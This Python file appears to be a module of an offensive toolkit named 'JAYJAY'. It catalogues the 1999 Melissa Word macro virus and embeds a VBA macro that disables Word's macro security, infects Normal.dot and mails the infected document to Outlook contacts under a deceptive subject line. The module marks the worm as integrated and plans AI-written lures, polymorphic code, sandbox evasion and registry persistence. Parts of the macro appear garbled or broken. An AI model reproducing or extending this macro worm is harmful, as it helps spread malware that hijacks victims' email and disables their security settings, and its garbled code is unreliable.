#!/usr/bin/env python3
"""
Melissa Virus — JAYJAY v13.0 Integration
Original: 1999, Word-Makro-Virus, E-Mail-Verteilung
JAYJAY-Integration: Makro-Vektor, Dokumenten-Propagation
"""

class Melissa:
    NAME = "Melissa"
    YEAR = 1999
    VECTOR = "Word Makro / E-Mail"
    INFECTIONS = "1,000,000+"
    PAYLOAD = "E-Mail flooding + Document infection"

    def __init__(self, jayjay_core):
        self.core = jayjay_core

    def analyze(self):
        return {
            "name": self.NAME,
            "year": self.YEAR,
            "author": "David L. Smith",
            "vector": self.VECTOR,
            "infections": self.INFECTIONS,
            "payload": self.PAYLOAD,
            "techniques": [
                "Word 97/2000 Makro infection",
                "Outlook MAPI address book harvesting",
                "E-Mail self-propagation (first 50 contacts)",
                "Document template infection (Normal.dot)",
                "Social Engineering (important message)",
                "Registry date check (prevents re-infection same day)"
            ],
            "macro_code": """
Sub AutoOpen()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = False
        System.PrivateProfileString("", "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security", "Level") = 1&
    End If

    Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)

    If ADI1.Name <> "Melissa" Then
        ADI1.Export "C:\\Melissa.txt"
        Set openDoc = Documents.Open("C:\\Melissa.txt")
    End If

    If NTI1.Name <> "Melissa" Then
        NTI1.CodeModule.AddFromFile ("C:\\Melissa.txt")
        NTI1.Name = "Melissa"
    End If

    If System.PrivateProfileString("", "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\", "Melissa?") <> "... by Kwyjibo" Then
        If Upl.Day = 1 Then
            Set myOlApp = CreateObject("Outlook.Application")
            Set myNameSpace = myOlApp.GetNameSpace("MAPI")
            Set myAddressList = myNameSpace.AddressLists(1)
            x = 1
            Set myAddressEntry = myAddressList.AddressEntries(x)
            Set myItem = myOlApp.CreateItem(0)
            myItem.To = myAddressEntry.Address
            myItem.Subject = "Important Message From " & Application.UserName
            myItem.Body = "Here is that document you asked for ... don't show anyone else ;-)"
            myItem.Attachments.Add ActiveDocument.FullName
            myItem.Send
            x = x + 1
        End If
        System.PrivateProfileString("", "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\", "Melissa?") = "... by Kwyjibo"
    End If
End Sub
            """,
            "targets": [
                "Microsoft Word 97/2000",
                "Microsoft Outlook",
                "Windows 95/98/NT"
            ],
            "impact": "$80M+ damage, email servers overloaded",
            "spread_rate": "Exponential via Outlook contacts",
            "detection": "Macro antivirus, Email filtering",
            "mitigation": [
                "Disable macros by default",
                "Email attachment scanning",
                "Macro security levels",
                "User awareness training"
            ],
            "jayjay_integration": {
                "layer": 3,
                "method": "Document Macro / E-Mail",
                "status": "INTEGRATED — ABSOLUTE",
                "enhancement": "AI-generated convincing document content",
                "evasion": "Polymorphic VBA, sandbox detection",
                "persistence": "Normal.dot + Registry"
            }
        }
